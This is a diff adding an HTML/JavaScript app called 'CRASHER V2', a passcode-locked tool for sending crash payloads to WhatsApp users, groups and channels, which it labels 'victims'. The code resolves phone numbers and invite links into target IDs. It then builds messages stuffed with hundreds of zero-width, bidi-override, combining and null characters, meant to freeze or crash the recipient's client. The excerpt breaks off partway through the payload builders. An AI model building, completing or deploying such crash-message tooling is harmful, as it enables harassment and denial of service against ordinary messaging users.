@@ -1,0 +1,939 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#0a0507">
+<title>CRASHER V2</title>
+<style>
+  :root{
+    --bg:#080406; --panel:#140a0e; --card:#160a0e;
+    --line:#2a1218; --line2:#3a141c;
+    --txt:#f2dfe3; --dim:#8a5f68;
+    --red:#ff2d55; --red2:#ff1744;
+    --red-glow:rgba(255,45,85,.35);
+    --red-dim:rgba(255,45,85,.12);
+  }
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{
+    margin:0;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    background:
+      radial-gradient(120% 60% at 50% 0%, #1a0a10 0%, transparent 60%),
+      radial-gradient(120% 80% at 50% 100%, #1a0810 0%, transparent 55%),
+      var(--bg);
+    color:var(--txt); min-height:100vh; overflow-x:hidden;
+  }
+  .phone{max-width:460px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column;padding:18px 14px 0}
+
+  .head{display:flex;align-items:center;justify-content:space-between;padding:2px 4px 16px}
+  .head h1{margin:0;font-size:15px;letter-spacing:.22em;font-weight:800;color:#fff;text-transform:uppercase;text-shadow:0 0 14px var(--red-glow)}
+  .head h1 span{color:var(--red)}
+  .head .ic{display:flex;gap:8px}
+  .ic button{width:32px;height:32px;border-radius:9px;border:1px solid var(--line);background:var(--panel);color:var(--dim);font-size:14px;cursor:pointer;display:grid;place-items:center}
+  .ic button:hover{border-color:var(--red);color:var(--red)}
+
+  .tabs{display:grid;grid-template-columns:1fr 1fr 1fr;gap:5px;padding:5px;background:var(--panel);border:1px solid var(--line);border-radius:14px;margin-bottom:18px}
+  .tabs button{appearance:none;border:0;background:transparent;color:var(--dim);font:inherit;font-size:12.5px;font-weight:600;padding:11px 4px;border-radius:10px;display:flex;align-items:center;justify-content:center;gap:6px;cursor:pointer;transition:.15s;white-space:nowrap}
+  .tabs button.on{background:linear-gradient(180deg,#241016,#1a0a10);color:#fff;box-shadow:0 0 0 1px var(--red-dim), 0 6px 18px -8px var(--red-glow)}
+  .tabs button.on svg{color:var(--red)}
+
+  .label{font-size:10.5px;letter-spacing:.2em;color:var(--dim);text-transform:uppercase;font-weight:700;margin:0 4px 10px}
+
+  .plist{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:18px}
+  .pitem{border:1px solid var(--line);background:var(--card);border-radius:11px;padding:11px 12px;cursor:pointer;transition:.15s;position:relative}
+  .pitem .t{font-size:11.5px;font-weight:700;color:#c99;letter-spacing:.04em;padding-right:36px}
+  .pitem .s{font-size:9.5px;color:#5c3a42;letter-spacing:.1em;margin-top:3px;text-transform:uppercase;font-weight:700}
+  .pitem .w{position:absolute;bottom:8px;right:9px;font-size:8.5px;font-weight:800;color:#5c3a42;letter-spacing:.06em}
+  .pitem:hover{border-color:var(--line2)}
+  .pitem.on{border-color:var(--red);background:linear-gradient(180deg,#2a0d16,#18080e);box-shadow:0 0 0 1px var(--red-dim),0 0 18px -8px var(--red-glow)}
+  .pitem.on .t{color:#fff}
+  .pitem.on .s{color:var(--red)}
+  .pitem.on .w{color:var(--red)}
+
+  .field{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:13px 15px;margin-bottom:6px;transition:.15s}
+  .field:focus-within{border-color:var(--red);box-shadow:0 0 0 1px var(--red-dim)}
+  .field input{width:100%;background:transparent;border:0;outline:none;color:#fff;font:inherit;font-size:14.5px;letter-spacing:.04em}
+  .field input::placeholder{color:#5c3a42}
+
+  .resolve-strip{
+    display:none;margin-bottom:16px;padding:9px 12px;
+    background:#0d0407;border:1px solid var(--line2);border-radius:10px;
+    font-family:ui-monospace,Menlo,Consolas,monospace;font-size:10.5px;
+    color:var(--dim);letter-spacing:.04em;
+  }
+  .resolve-strip.show{display:block;animation:fade .2s}
+  .resolve-strip .row{display:flex;justify-content:space-between;gap:10px;padding:2px 0}
+  .resolve-strip .k{color:#5c3a42;text-transform:uppercase;font-weight:700;letter-spacing:.12em;font-size:9.5px}
+  .resolve-strip .v{color:var(--red);font-weight:700;text-align:right;word-break:break-all}
+  .resolve-strip .v.ok{color:#ff5577}
+  .resolve-strip .v.warn{color:#ffb020}
+  .resolve-strip .v.bad{color:var(--red2)}
+
+  .field-hint{font-size:10px;color:#5c3a42;letter-spacing:.1em;font-weight:700;text-transform:uppercase;margin:0 4px 14px}
+
+  .delay-row{display:flex;align-items:center;justify-content:space-between;gap:10px;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:11px 14px;margin-bottom:16px}
+  .delay-row .lbl{font-size:10.5px;letter-spacing:.16em;color:var(--dim);text-transform:uppercase;font-weight:700}
+  .delay-row input{width:80px;background:transparent;border:0;outline:none;color:var(--red);font:inherit;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:14px;font-weight:700;text-align:right;letter-spacing:.05em}
+  .delay-row .unit{font-size:11px;color:var(--dim);letter-spacing:.08em;font-weight:700}
+
+  .exec{width:100%;border:0;border-radius:13px;padding:16px;font:inherit;font-size:15px;font-weight:800;letter-spacing:.12em;text-transform:uppercase;color:#fff;cursor:pointer;background:linear-gradient(180deg,var(--red) 0%,var(--red2) 100%);box-shadow:0 10px 30px -10px var(--red-glow), 0 0 0 1px rgba(255,45,85,.25) inset;display:flex;align-items:center;justify-content:center;gap:10px;transition:.15s}
+  .exec:active{transform:translateY(1px) scale(.995);filter:brightness(.95)}
+  .exec:disabled{opacity:.55;cursor:progress}
+
+  .hint{margin-top:14px;background:var(--card);border:1px solid var(--line);border-radius:11px;padding:12px 14px;font-size:11.5px;color:var(--dim);letter-spacing:.03em;font-family:ui-monospace,Menlo,Consolas,monospace}
+  .hint b{color:var(--red);font-weight:700}
+  .hint .row2{display:flex;justify-content:space-between;gap:10px;margin-top:6px;font-size:10.5px;color:#5c3a42}
+  .hint .row2 span b{color:#c99}
+
+  .toast{position:fixed;top:16px;left:50%;transform:translate(-50%,-140%);width:calc(100% - 32px);max-width:420px;z-index:60;background:linear-gradient(180deg,#1b0a10,#120609);border:1px solid var(--line2);border-left:3px solid var(--red);border-radius:13px;padding:12px 40px 12px 44px;box-shadow:0 20px 50px -20px rgba(255,45,85,.6), 0 8px 30px -12px #000;transition:transform .35s cubic-bezier(.2,.9,.3,1.2), opacity .25s;opacity:0;pointer-events:none}
+  .toast.show{transform:translate(-50%,0);opacity:1}
+  .toast .ico{position:absolute;left:12px;top:50%;transform:translateY(-50%);width:24px;height:24px;border-radius:50%;background:var(--red-dim);display:grid;place-items:center;color:var(--red)}
+  .toast h4{margin:0 0 3px;font-size:11px;letter-spacing:.18em;color:var(--red);text-transform:uppercase}
+  .toast p{margin:0;font-size:12.5px;color:#e8cdd2}
+  .toast .x{position:absolute;right:10px;top:10px;border:0;background:transparent;color:var(--dim);font-size:15px;cursor:pointer;line-height:1}
+  .toast .bar{position:absolute;left:0;bottom:0;height:2px;background:var(--red);width:100%;transform-origin:left}
+  .toast.show .bar{animation:drain 4s linear forwards}
+  @keyframes drain{from{transform:scaleX(1)}to{transform:scaleX(0)}}
+
+  .backdrop{position:fixed;inset:0;background:rgba(4,2,3,.75);backdrop-filter:blur(6px);z-index:70;display:flex;align-items:flex-end;justify-content:center;opacity:0;pointer-events:none;transition:.25s;overflow:auto}
+  .backdrop.show{opacity:1;pointer-events:auto}
+  .sheet{width:100%;max-width:460px;background:linear-gradient(180deg,#150a0e,#0d0508);border:1px solid var(--line2);border-bottom:0;border-radius:22px 22px 0 0;padding:26px 18px 22px;transform:translateY(30px);transition:.3s cubic-bezier(.2,.9,.3,1.1);box-shadow:0 -30px 80px -20px rgba(255,45,85,.35);position:relative}
+  .backdrop.show .sheet{transform:translateY(0)}
+  .sheet .close{position:absolute;right:14px;top:14px;border:1px solid var(--line);background:transparent;color:var(--dim);border-radius:9px;padding:6px 12px;font:inherit;font-size:11.5px;font-weight:600;cursor:pointer;letter-spacing:.05em}
+  .sheet .close:hover{color:var(--red);border-color:var(--red)}
+
+  .check-wrap{display:grid;place-items:center;margin:8px 0 18px}
+  .check-ring{width:74px;height:74px;border-radius:50%;background:var(--red-dim);border:1px solid rgba(255,45,85,.35);display:grid;place-items:center;color:var(--red);box-shadow:0 0 40px -6px var(--red-glow);animation:pop .35s cubic-bezier(.2,.9,.3,1.4)}
+  @keyframes pop{from{transform:scale(.7);opacity:0}to{transform:scale(1);opacity:1}}
+  .sheet h2{text-align:center;margin:0 0 6px;font-size:22px;font-weight:800;letter-spacing:.02em;color:var(--red);text-shadow:0 0 24px var(--red-glow)}
+  .sheet .sub{text-align:center;margin:0 0 20px;font-size:12.5px;color:var(--dim)}
+
+  .rows{display:grid;gap:8px}
+  .row{background:#100609;border:1px solid var(--line);border-radius:11px;padding:13px 14px;display:flex;align-items:center;justify-content:space-between;gap:12px}
+  .row .k{font-size:10.5px;letter-spacing:.16em;color:var(--dim);text-transform:uppercase;font-weight:700;display:flex;align-items:center;gap:7px;flex:none}
+  .row .k::before{content:"";width:5px;height:5px;border-radius:50%;background:var(--red);box-shadow:0 0 8px var(--red)}
+  .row .v{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:13px;color:#fff;font-weight:600;letter-spacing:.03em;text-align:right;word-break:break-all;min-width:0}
+  .row .v.red{color:var(--red)}
+
+  .nav{margin-top:auto;display:grid;grid-template-columns:repeat(4,1fr);border-top:1px solid var(--line);background:rgba(10,5,7,.9);backdrop-filter:blur(8px);padding:10px 4px 16px;position:sticky;bottom:0}
+  .nav button{border:0;background:transparent;color:#5c3a42;font:inherit;font-size:10px;font-weight:600;letter-spacing:.06em;display:flex;flex-direction:column;align-items:center;gap:5px;cursor:pointer;padding:4px 0}
+  .nav button.on{color:var(--red)}
+  .nav svg{color:inherit}
+
+  .page{display:none}
+  .page.on{display:block;animation:fade .25s}
+  @keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+
+  .blank{text-align:center;color:#4a2b33;font-size:12px;padding:60px 20px;letter-spacing:.1em;text-transform:uppercase;font-weight:700}
+
+  .gate{position:fixed;inset:0;z-index:200;background:radial-gradient(120% 60% at 50% 0%, #1a0a10 0%, transparent 60%),radial-gradient(120% 80% at 50% 100%, #1a0810 0%, transparent 55%),var(--bg);display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px 20px;transition:opacity .3s, transform .3s}
+  .gate.hide{opacity:0;transform:scale(1.02);pointer-events:none}
+  .gate.shake{animation:shake .4s cubic-bezier(.36,.07,.19,.97)}
+  @keyframes shake{10%,90%{transform:translateX(-2px)}20%,80%{transform:translateX(4px)}30%,50%,70%{transform:translateX(-7px)}40%,60%{transform:translateX(7px)}}
+  .gate .lock{width:70px;height:70px;border-radius:50%;background:var(--red-dim);border:1px solid rgba(255,45,85,.35);display:grid;place-items:center;color:var(--red);box-shadow:0 0 50px -6px var(--red-glow);margin-bottom:20px}
+  .gate h2{margin:0 0 6px;font-size:17px;font-weight:800;letter-spacing:.22em;color:#fff;text-transform:uppercase;text-shadow:0 0 18px var(--red-glow)}
+  .gate h2 span{color:var(--red)}
+  .gate .sub{font-size:11px;color:var(--dim);letter-spacing:.16em;text-transform:uppercase;margin-bottom:26px;font-weight:700}
+  .dots{display:flex;gap:12px;margin-bottom:28px}
+  .dot{width:14px;height:14px;border-radius:50%;border:1.5px solid var(--line2);background:transparent;transition:.15s}
+  .dot.fill{background:var(--red);border-color:var(--red);box-shadow:0 0 12px var(--red-glow)}
+  .dot.err{background:var(--red2);border-color:var(--red2);box-shadow:0 0 14px rgba(255,23,68,.7)}
+  .pad{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;width:100%;max-width:280px}
+  .pad button{aspect-ratio:1/1;border-radius:50%;border:1px solid var(--line);background:linear-gradient(180deg,#160a0e,#0d0508);color:#fff;font:inherit;font-size:22px;font-weight:700;cursor:pointer;display:grid;place-items:center;transition:.12s;box-shadow:0 4px 16px -8px #000}
+  .pad button:hover{border-color:var(--line2)}
+  .pad button:active,.pad button.press{background:linear-gradient(180deg,#2a0d16,#18080e);border-color:var(--red);color:var(--red);transform:scale(.96);box-shadow:0 0 18px -4px var(--red-glow)}
+  .pad .empty{border:0;background:transparent;box-shadow:none;cursor:default}
+  .pad .del{font-size:16px;letter-spacing:.05em}
+  .gate .err-msg{margin-top:20px;font-size:11px;letter-spacing:.14em;text-transform:uppercase;font-weight:700;color:var(--red);min-height:14px}
+  .gate .hint-small{margin-top:24px;font-size:10px;color:#4a2b33;letter-spacing:.12em;text-transform:uppercase;font-weight:700}
+</style>
+</head>
+<body>
+
+<div class="gate" id="gate">
+  <div class="lock">
+    <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <rect x="4" y="11" width="16" height="10" rx="2"/>
+      <path d="M8 11V7a4 4 0 0 1 8 0v4"/>
+    </svg>
+  </div>
+  <h2>CRASHER <span>LOCK</span></h2>
+  <div class="sub">Enter Passcode</div>
+  <div class="dots" id="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+  <div class="pad" id="pad">
+    <button data-k="1">1</button><button data-k="2">2</button><button data-k="3">3</button>
+    <button data-k="4">4</button><button data-k="5">5</button><button data-k="6">6</button>
+    <button data-k="7">7</button><button data-k="8">8</button><button data-k="9">9</button>
+    <button class="empty" disabled></button><button data-k="0">0</button>
+    <button class="del" data-k="del" aria-label="delete">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21 5H8l-5 7 5 7h13a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2z"/>
+        <line x1="17" y1="9" x2="11" y2="15"/><line x1="11" y1="9" x2="17" y2="15"/>
+      </svg>
+    </button>
+  </div>
+  <div class="err-msg" id="err-msg"></div>
+  <div class="hint-small">4-digit access code</div>
+</div>
+
+<div class="phone">
+
+  <div class="head">
+    <h1>CRASHER <span>V2</span></h1>
+    <div class="ic">
+      <button title="refresh" id="refresh">↻</button>
+      <button title="lock" id="lock-btn">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="4" y="11" width="16" height="10" rx="2"/>
+          <path d="M8 11V7a4 4 0 0 1 8 0v4"/>
+        </svg>
+      </button>
+    </div>
+  </div>
+
+  <div class="tabs" id="tabs">
+    <button data-scope="victim" id="tab-victim">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="8" r="4"/><path d="M4 21a8 8 0 0 1 16 0"/></svg>
+      Victim
+    </button>
+    <button data-scope="group" id="tab-group">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+      Group
+    </button>
+    <button data-scope="channel" id="tab-channel">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 11v2a1 1 0 0 0 1 1h3l4 4V6L7 10H4a1 1 0 0 0-1 1z"/><path d="M16 8a5 5 0 0 1 0 8"/></svg>
+      Channel
+    </button>
+  </div>
+
+  <div class="page" id="page-victim">
+    <p class="label">Payload — Victim Target</p>
+    <div class="plist" id="plist-victim"></div>
+    <p class="label">Target Number</p>
+    <div class="field"><input id="victim-id" placeholder="2348012345678" inputmode="tel"></div>
+    <p class="field-hint" id="victim-resolve-hint">digits only · + stripped automatically</p>
+    <div class="delay-row">
+      <span class="lbl">Invis Delay</span>
+      <input id="victim-delay" type="number" min="0" max="60000" step="100" value="2500">
+      <span class="unit">ms</span>
+    </div>
+    <button class="exec" id="exec-victim">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M13 2 4.5 13.5H11L9.5 22 19 9.5h-6.5L13 2z"/></svg>
+      Execute Victim
+    </button>
+    <div class="hint" id="hint-victim">
+      Payload: <b>—</b>
+      <div class="row2"><span>scope: <b>victim</b></span><span>weight: <b>—</b></span></div>
+    </div>
+  </div>
+
+  <div class="page" id="page-group">
+    <p class="label">Payload — Group Target</p>
+    <div class="plist" id="plist-group"></div>
+    <p class="label">Group ID or Invite Link</p>
+    <div class="field"><input id="group-id" placeholder="120363412897468936  ·  chat.whatsapp.com/XXXX" inputmode="text"></div>
+    <div class="resolve-strip" id="group-resolve">
+      <div class="row"><span class="k">input</span><span class="v" id="group-input-kind">—</span></div>
+      <div class="row"><span class="k">code</span><span class="v" id="group-code">—</span></div>
+      <div class="row"><span class="k">resolve</span><span class="v" id="group-resolve-cmd">—</span></div>
+    </div>
+    <p class="field-hint">paste raw jid <b style="color:#c99">or</b> a chat.whatsapp.com invite link</p>
+    <div class="delay-row">
+      <span class="lbl">Invis Delay</span>
+      <input id="group-delay" type="number" min="0" max="60000" step="100" value="2500">
+      <span class="unit">ms</span>
+    </div>
+    <button class="exec" id="exec-group">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M13 2 4.5 13.5H11L9.5 22 19 9.5h-6.5L13 2z"/></svg>
+      Execute Group
+    </button>
+    <div class="hint" id="hint-group">
+      Payload: <b>—</b>
+      <div class="row2"><span>scope: <b>group</b></span><span>weight: <b>—</b></span></div>
+    </div>
+  </div>
+
+  <div class="page" id="page-channel">
+    <p class="label">Payload — Channel Target</p>
+    <div class="plist" id="plist-channel"></div>
+    <p class="label">Channel JID or Invite Link</p>
+    <div class="field"><input id="channel-id" placeholder="1203634...@newsletter  ·  whatsapp.com/channel/XXXX" inputmode="text"></div>
+    <div class="resolve-strip" id="channel-resolve">
+      <div class="row"><span class="k">input</span><span class="v" id="channel-input-kind">—</span></div>
+      <div class="row"><span class="k">code</span><span class="v" id="channel-code">—</span></div>
+      <div class="row"><span class="k">resolve</span><span class="v" id="channel-resolve-cmd">—</span></div>
+    </div>
+    <p class="field-hint">paste raw jid <b style="color:#c99">or</b> a whatsapp.com/channel invite link</p>
+    <div class="delay-row">
+      <span class="lbl">Invis Delay</span>
+      <input id="channel-delay" type="number" min="0" max="60000" step="100" value="2500">
+      <span class="unit">ms</span>
+    </div>
+    <button class="exec" id="exec-channel">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M13 2 4.5 13.5H11L9.5 22 19 9.5h-6.5L13 2z"/></svg>
+      Execute Channel
+    </button>
+    <div class="hint" id="hint-channel">
+      Payload: <b>—</b>
+      <div class="row2"><span>scope: <b>channel</b></span><span>weight: <b>—</b></span></div>
+    </div>
+  </div>
+
+  <div class="page" id="page-tools"><div class="blank">tools bay — offline<br>no modules attached</div></div>
+  <div class="page" id="page-account"><div class="blank">account — local only<br>nothing linked</div></div>
+
+  <nav class="nav" id="nav">
+    <button data-page="tools">
+      <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 10.5 12 3l9 7.5"/><path d="M5 9.5V21h14V9.5"/></svg>
+      Home
+    </button>
+    <button data-page="execute">
+      <svg width="19" height="19" viewBox="0 0 24 24" fill="currentColor"><path d="M13 2 4.5 13.5H11L9.5 22 19 9.5h-6.5L13 2z"/></svg>
+      Execute
+    </button>
+    <button data-page="tools">
+      <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.7 6.3a4 4 0 0 1 5 5L21 12l-9 9-3-3 9-9-1.3-2.7z"/><path d="M3 21l4-4"/></svg>
+      Tools
+    </button>
+    <button data-page="account">
+      <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="4"/><path d="M4 21a8 8 0 0 1 16 0"/></svg>
+      Account
+    </button>
+  </nav>
+</div>
+
+<div class="toast" id="toast">
+  <div class="ico">
+    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+  </div>
+  <button class="x" id="toast-x">×</button>
+  <h4>Success</h4>
+  <p id="toast-msg">Execution successful</p>
+  <div class="bar"></div>
+</div>
+
+<div class="backdrop" id="backdrop">
+  <div class="sheet">
+    <button class="close" id="modal-close">✕ Close</button>
+    <div class="check-wrap">
+      <div class="check-ring">
+        <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+      </div>
+    </div>
+    <h2>Accomplished</h2>
+    <p class="sub">Relay payload prepared for target</p>
+    <div class="rows">
+      <div class="row"><span class="k">Scope</span><span class="v red" id="m-scope">—</span></div>
+      <div class="row"><span class="k">Target</span><span class="v red" id="m-target">—</span></div>
+      <div class="row"><span class="k">Source</span><span class="v red" id="m-source">—</span></div>
+      <div class="row"><span class="k">Payload</span><span class="v red" id="m-payload">—</span></div>
+      <div class="row"><span class="k">Message ID</span><span class="v red" id="m-msgid">—</span></div>
+      <div class="row"><span class="k">Delay</span><span class="v red" id="m-delay">—</span></div>
+      <div class="row"><span class="k">Weight</span><span class="v red" id="m-weight">—</span></div>
+      <div class="row"><span class="k">Status</span><span class="v red" id="m-status">200 OK</span></div>
+      <div class="row"><span class="k">Latency</span><span class="v red" id="m-latency">— ms</span></div>
+      <div class="row"><span class="k">Time</span><span class="v red" id="m-time">--:--:--</span></div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  "use strict";
+  const $ = s => document.querySelector(s);
+  const $$ = s => [...document.querySelectorAll(s)];
+
+  /* ================= PASSWORD GATE ================= */
+  const PASSCODE = "4080";
+  let entered = "";
+  const dots = $$("#dots .dot");
+  const gateEl = $("#gate");
+  const errMsg = $("#err-msg");
+  let lockedOut = false;
+
+  function paintDots(state){
+    dots.forEach((d, i) => {
+      d.classList.remove("fill","err");
+      if(state === "err" && i < entered.length) d.classList.add("err");
+      else if(i < entered.length) d.classList.add("fill");
+    });
+  }
+  function clearEntry(){ entered = ""; paintDots(); }
+  function fail(){
+    gateEl.classList.add("shake"); paintDots("err");
+    errMsg.textContent = "Wrong passcode";
+    setTimeout(() => gateEl.classList.remove("shake"), 400);
+    setTimeout(() => { clearEntry(); errMsg.textContent = ""; }, 800);
+  }
+  function succeed(){
+    gateEl.classList.add("hide"); errMsg.textContent = "";
+    try { sessionStorage.setItem("crasher_unlocked", "1"); } catch(e){}
+    setTimeout(() => { gateEl.style.display = "none"; }, 320);
+  }
+  function pressKey(k){
+    if(lockedOut) return;
+    if(k === "del"){ entered = entered.slice(0,-1); paintDots(); errMsg.textContent = ""; return; }
+    if(entered.length >= 4) return;
+    entered += k; paintDots();
+    if(entered.length === 4){
+      lockedOut = true;
+      setTimeout(() => { if(entered === PASSCODE) succeed(); else fail(); lockedOut = false; }, 180);
+    }
+  }
+  $$("#pad button").forEach(b => b.addEventListener("click", () => {
+    const k = b.dataset.k; if(!k) return; pressKey(k);
+  }));
+  window.addEventListener("keydown", e => {
+    if(gateEl.style.display === "none") return;
+    if(e.key >= "0" && e.key <= "9") pressKey(e.key);
+    else if(e.key === "Backspace") pressKey("del");
+  });
+  try { if(sessionStorage.getItem("crasher_unlocked") === "1") gateEl.style.display = "none"; } catch(e){}
+  $("#lock-btn").onclick = () => {
+    try { sessionStorage.removeItem("crasher_unlocked"); } catch(e){}
+    clearEntry(); errMsg.textContent = ""; gateEl.style.display = "";
+    void gateEl.offsetWidth; gateEl.classList.remove("hide");
+  };
+
+  /* ============================================================
+     SINGLE SOURCE OF TRUTH
+     ============================================================ */
+  const SCOPES = ["victim", "group", "channel"];
+  let activeScope = "group";
+
+  function setScope(scope){
+    if(!SCOPES.includes(scope)) return;
+    activeScope = scope;
+    render();
+  }
+  function render(){
+    SCOPES.forEach(s => {
+      const page = document.getElementById("page-" + s);
+      if(page) page.classList.toggle("on", s === activeScope);
+      const tab = document.getElementById("tab-" + s);
+      if(tab) tab.classList.toggle("on", s === activeScope);
+    });
+    $$("#nav button").forEach(b => {
+      const p = b.dataset.page;
+      b.classList.toggle("on", p === "execute" || p === activeScope);
+    });
+    ["page-tools","page-account"].forEach(id => {
+      const el = document.getElementById(id);
+      if(el) el.classList.remove("on");
+    });
+    updateHint(activeScope);
+  }
+
+  $$("#tabs button").forEach(btn => {
+    btn.addEventListener("click", () => setScope(btn.dataset.scope));
+  });
+  $$("#nav button").forEach(btn => {
+    btn.addEventListener("click", () => {
+      const p = btn.dataset.page;
+      if(p === "execute"){ setScope(activeScope || "group"); return; }
+      SCOPES.forEach(s => {
+        const el = document.getElementById("page-" + s);
+        if(el) el.classList.remove("on");
+        const tab = document.getElementById("tab-" + s);
+        if(tab) tab.classList.remove("on");
+      });
+      const el = document.getElementById("page-" + p);
+      if(el) el.classList.add("on");
+      $$("#nav button").forEach(b => b.classList.remove("on"));
+      btn.classList.add("on");
+    });
+  });
+
+  /* ============================================================
+     LINK RESOLVER
+     detects invite links, extracts the code, emits the resolver cmd
+     ============================================================ */
+  const LINK_PATTERNS = {
+    group: [
+      /chat\.whatsapp\.com\/(?:invite\/)?([A-Za-z0-9_-]{10,})/i,
+      /whatsapp\.com\/chat\/([A-Za-z0-9_-]{10,})/i,
+      /wa\.me\/chat\/([A-Za-z0-9_-]{10,})/i
+    ],
+    channel: [
+      /whatsapp\.com\/channel\/([A-Za-z0-9_-]{10,})/i,
+      /whatsapp\.com\/channel\/([A-Za-z0-9_-]{10,})\?/i,
+      /wa\.me\/channel\/([A-Za-z0-9_-]{10,})/i
+    ]
+  };
+
+  function parseTarget(raw, scope){
+    const v = (raw || "").trim();
+    if(!v) return { kind: "empty", jid: "", code: "", resolver: "" };
+
+    if(scope === "victim"){
+      const digits = v.replace(/[^\d]/g, "");
+      if(!digits) return { kind: "invalid", jid: "", code: "", resolver: "" };
+      return { kind: "number", jid: digits, code: "", resolver: "" };
+    }
+
+    // already a jid
+    if(scope === "group" && /@g\.us$/i.test(v)){
+      return { kind: "jid", jid: v, code: "", resolver: "" };
+    }
+    if(scope === "channel" && /@newsletter$/i.test(v)){
+      return { kind: "jid", jid: v, code: "", resolver: "" };
+    }
+
+    // invite link
+    const pats = LINK_PATTERNS[scope] || [];
+    for(const p of pats){
+      const m = v.match(p);
+      if(m && m[1]){
+        const code = m[1];
+        const resolver = scope === "group"
+          ? "sock.groupMetadata(" + code + ")"
+          : "sock.newsletterMetadata('invite', " + code + ")";
+        const placeholder = scope === "group"
+          ? code + "@g.us"
+          : code + "@newsletter";
+        return { kind: "invite", jid: placeholder, code, resolver };
+      }
+    }
+
+    // raw digits — treat as a group/jid pre-form
+    if(/^\d{10,}$/.test(v)){
+      return {
+        kind: "raw",
+        jid: scope === "group" ? v + "@g.us" : v + "@newsletter",
+        code: v, resolver: ""
+      };
+    }
+
+    return { kind: "invalid", jid: "", code: "", resolver: "" };
+  }
+
+  function updateResolveStrip(scope){
+    const strip = document.getElementById(scope + "-resolve");
+    if(!strip) return;
+    const el = document.getElementById(scope + "-id");
+    if(!el) return;
+    const parsed = parseTarget(el.value, scope);
+    const kindEl = document.getElementById(scope + "-input-kind");
+    const codeEl = document.getElementById(scope + "-code");
+    const cmdEl  = document.getElementById(scope + "-resolve-cmd");
+
+    if(parsed.kind === "empty" || parsed.kind === "jid" || parsed.kind === "number"){
+      strip.classList.remove("show");
+      return;
+    }
+    strip.classList.add("show");
+
+    kindEl.textContent = parsed.kind === "invite" ? "invite link" : parsed.kind;
+    kindEl.className = "v " + (parsed.kind === "invite" ? "ok" : parsed.kind === "invalid" ? "bad" : "warn");
+
+    codeEl.textContent = parsed.code || "—";
+    codeEl.className = "v " + (parsed.code ? "ok" : "bad");
+
+    if(parsed.kind === "invite" && parsed.resolver){
+      cmdEl.textContent = parsed.resolver;
+      cmdEl.className = "v ok";
+    } else if(parsed.kind === "invalid"){
+      cmdEl.textContent = "unrecognized input";
+      cmdEl.className = "v bad";
+    } else {
+      cmdEl.textContent = "raw jid passthrough";
+      cmdEl.className = "v warn";
+    }
+  }
+
+  /* ============================================================
+     RELAY PAYLOAD SYSTEM
+     ============================================================ */
+  const rep = (s,n) => s.repeat(Math.max(0, n|0));
+  const ZW   = "\u200b\u200c\u200d\u2060";
+  const CM   = "\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308\u030a";
+  const BIDI = "\u202e\u202d\u202c\u2066\u2067\u2068\u2069";
+  const VAR  = "\ufe00\ufe01\ufe0e\ufe0f";
+  const TAG  = "\udb40\udc01\udb40\udc02\udb40\udc03";
+  const NULL = "\u0000";
+  const WJ   = "\u2060";
+
+  function makeId(){
+    const hex = "0123456789ABCDEF";
+    const bytes = new Uint8Array(32);
+    if(typeof crypto !== "undefined" && crypto.getRandomValues) crypto.getRandomValues(bytes);
+    else for(let i=0;i<32;i++) bytes[i] = Math.floor(Math.random()*256);
+    let id = "";
+    for(let i=0;i<32;i++) id += hex[bytes[i] % 16];
+    return id;
+  }
+
+  const INK = {
+    scc: (t, scope) => rep(ZW + BIDI + VAR, scope === "channel" ? 260 : scope === "group" ? 240 : 220)
+      + t
